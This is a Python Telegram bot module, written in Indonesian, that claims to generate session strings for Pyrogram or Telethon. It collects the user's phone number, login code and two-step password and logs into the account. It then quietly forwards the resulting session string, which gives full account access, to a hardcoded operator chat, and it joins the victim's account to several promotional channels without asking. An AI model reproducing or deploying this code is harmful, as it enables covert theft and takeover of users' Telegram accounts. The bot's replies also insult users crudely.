import asyncio
from telethon import TelegramClient
from pyrogram.types import Message
from pyrogram import Client, filters
from pyrogram1 import Client as Client1
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon.errors import rpcerrorlist
from pyrogram.errors import UserBannedInChannel
import telethon
import pyrogram
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

from pyrogram1.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1
)
from Amang.core.listen.listen import ListenerTimeout
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import API_ID, API_HASH
from Amang import *

ask_ques = "**Halo {}\n\nIni Adalah Bot String Session \n\nBuat ID 5 atau ID 6\n\nSilakan Pilih Session Mana yang ingun anda buat.\n\nNoted : Jika Buat String Pake Bot Ini, Tolong AddBlacklist Gcast di @amwangsupport.\n\nPERSTAN DENGAN ANAK² BOT TELEGRAM...**"


goblok_jamet = [
    [
      InlineKeyboardButton(
        text="Buat String Session 📝",
        callback_data="generate"),
    ],
    [
      InlineKeyboardButton(
        text="Kembali",
      callback_data="ahh_ajg"),
    ],
  ]
  
admin_kynan = [
    [
      InlineKeyboardButton(text="👮‍AMANG", user_id=2073506739),
    ],
    [
      InlineKeyboardButton(
        text="Kembali",
      callback_data="ahh_ajg"),
    ],
  ]

buttons_ques = [
    [
        InlineKeyboardButton("Pyrogram V1", callback_data="pyrogram1"),
        InlineKeyboardButton("Pyrogram V2", callback_data="pyrogram"),
    ],
    [    InlineKeyboardButton("Telethon", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("Kembali", callback_data="ahh_ajg"),
    ],

]


@app.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
async def main(_, msg):
    await msg.reply(ask_ques.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    if telethon:
        ty = "Telethon"
    else:
        ty = "Pyrogram"
        if not old_pyro:
            ty += " v2"
    if is_bot:
        ty += " 𝐁𝐎𝐓"
    user_id = msg.chat.id
    api_id = API_ID
    api_hash = API_HASH
    api_hash_msg = await msg.chat.ask("**Lu yakin mo buat string ? Deak Gua Ga Mao Tanggung Jawab ! Balas `Y` Untuk Setuju atau ketik /cancel Untuk Batal**", filters=filters.text)
    if await cancelled(api_hash_msg):
            return
    """
    if await cancelled(api_id):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        await api_id_msg.reply('Not a valid API_ID (which must be an integer). Please start generating session again.', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    api_hash_msg = await msg.chat.ask('Please send your `API_HASH`', filters=filters.text)
    if await cancelled(salah):
        return
    api_hash = api_hash_msg.text
    """
    await asyncio.sleep(1.0)
    if not is_bot:
        t = "**Sekarang Kirim Nomer Akun Telegram Lu. \nContoh : `+62857XXXXX`\n\nKetik /cancel untuk membatalkan.**"
    else:
        t = "**Kirim Nomer Akun Telegram Lu.** \n**Contoh** : `+62857XXXXX` "
    phone_number_msg = await msg.chat.ask(t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    await msg.reply("**Lagi Ngirim OTP Ke Akun Lu...**")
    if telethon and is_bot or telethon:
        client = TelegramClient(StringSession(), api_id=api_id, api_hash=api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)

    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        await msg.reply('**Nomer Akun Telegram Lu Ga Terdaftar Jink.**\n**Yang Bener Dikit Blog, Dari Ulang.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await msg.chat.ask("**Sekarang Lu periksa OTP Di Akun Telegram Lu, Buru cepet kirim OTP ke sini.** \n **Cara Masukin OTP kek gini** `1 2 3 4 5`\n**Jangan Salah Ya Broh.**", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply('**Ngaret Lu Anjeng Lama...**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
            await msg.reply('**Kode Nya Salah Monyet, Mata Lu Buta Apa Gimana.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
            await msg.reply('**Goblok, Dibilang Pake Spasi Tiap Kode.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
            try:
                two_step_msg = await msg.chat.ask('**Masukin Password Akun Lu Jing.**', filters=filters.text, timeout=300)
            except ListenerTimeout:
                await msg.reply('**Anjeng, Demen Banget Ngaret Jadi Manusia**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_hash_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
                await two_step_msg.reply('**Lu Pikun Apa Gimana Si Nyet, Password Sendiri Salah.**', quote=True, reply_markup=InlineKeyboardMarkup(goblok_jamet))
                return
    elif telethon:
        await client.start(bot_token=phone_number)
    else:
        await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**{ty.upper()} NIH JING.** \n\n`{string_session}` \n\n**Minimal Bilang Makasih Ke** @amwang **Atau Ke** @amwangsupport **Karna Akun Lu Kaga Deak**"
    try:
        try:
            if telethon:
                await client(JoinChannelRequest("amwangsupport"))
                await client(JoinChannelRequest("amwangs"))
                await client(JoinChannelRequest("amangproject"))
                await client(JoinChannelRequest("jualtelprem"))
            else:
                await client.join_chat("amwangs")
                await client.join_chat("amangproject")
                await client.join_chat("amwangsupport")
                await client.join_chat("jualtelprem")
        except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
            await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
            return
        if not is_bot:
            await bot.send_message(msg.chat.id, text)
            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
        else:
            await bot.send_message(msg.chat.id, text)
            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
    except KeyError:
        pass
    await client.disconnect()
    await asyncio.sleep(1.0)

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("**Goblok Ga jelas !**",
          quote=True, reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return True
    elif "/restart" in msg.text:
        await msg.reply("**Ngapain Jink !**",
        quote=True, reply_markup=InlineKeyboardMarkup(goblok_jamet))
        return True
    elif msg.text.startswith("/"): 
        await msg.reply("**Goblok Ga jelas !**", quote=True)
        return True
    else:
        return False


__MODULE__ = "String"
__HELP__ = """
/start - Klik Buat String Session.
/stats - Untuk melihat stats pengguna string.
/bacot - Untuk mengirim pesan ke semua pengguna string.
"""
